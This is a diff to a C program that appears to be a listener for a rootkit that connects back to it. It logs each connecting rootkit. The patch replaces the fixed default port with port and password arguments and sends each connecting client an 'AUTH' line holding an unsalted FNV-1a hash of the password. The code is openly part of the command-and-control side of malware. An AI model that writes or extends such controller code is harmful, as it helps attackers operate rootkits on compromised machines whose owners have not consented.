@@ -1,5 +1,6 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
+#include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -7,8 +8,9 @@
 #include <time.h>
 #include <unistd.h>
 
-#define DEFAULT_PORT 4242
 #define BUF_SIZE     256
+#define FNV1A_OFFSET 2166136261U
+#define FNV1A_PRIME  16777619U
 
 static void timestamp(void)
 {
@@ -19,14 +21,56 @@ static void timestamp(void)
     printf("[%s] ", buf);
 }
 
+static uint32_t fnv1a_hash(const char *str)
+{
+    uint32_t hash = FNV1A_OFFSET;
+
+    while (*str) {
+        hash ^= (unsigned char)*str;
+        hash *= FNV1A_PRIME;
+        str++;
+    }
+
+    return hash;
+}
+
+static int write_all(int fd, const char *buf, size_t len)
+{
+    while (len > 0) {
+        ssize_t written = write(fd, buf, len);
+
+        if (written <= 0)
+            return -1;
+
+        buf += written;
+        len -= written;
+    }
+
+    return 0;
+}
+
 int main(int argc, char **argv)
 {
-    int port = (argc > 1) ? atoi(argv[1]) : DEFAULT_PORT;
+    int port;
+    const char *password;
     int server_fd, client_fd;
     struct sockaddr_in server_addr = { 0 }, client_addr = { 0 };
     socklen_t client_len = sizeof(client_addr);
     char buf[BUF_SIZE];
+    char auth_msg[BUF_SIZE];
     int opt = 1;
+
+    if (argc != 3) {
+        fprintf(stderr, "Usage: %s <port> <password>\n", argv[0]);
+        return 1;
+    }
+
+    port = atoi(argv[1]);
+    password = argv[2];
+    if (port <= 0 || password[0] == '\0') {
+        fprintf(stderr, "Invalid port or empty password\n");
+        return 1;
+    }
 
     server_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (server_fd < 0) {
@@ -65,6 +109,17 @@ int main(int argc, char **argv)
 
         timestamp();
         printf("[+] Rootkit connected from %s\n", inet_ntoa(client_addr.sin_addr));
+        fflush(stdout);
+
+        snprintf(auth_msg, sizeof(auth_msg), "AUTH %08x\n", fnv1a_hash(password));
+        if (write_all(client_fd, auth_msg, strlen(auth_msg)) < 0) {
+            perror("write AUTH");
+            close(client_fd);
+            continue;
+        }
+
+        timestamp();
+        printf("[+] AUTH sent\n");
         fflush(stdout);
 
         /* drain the socket until the rootkit disconnects */
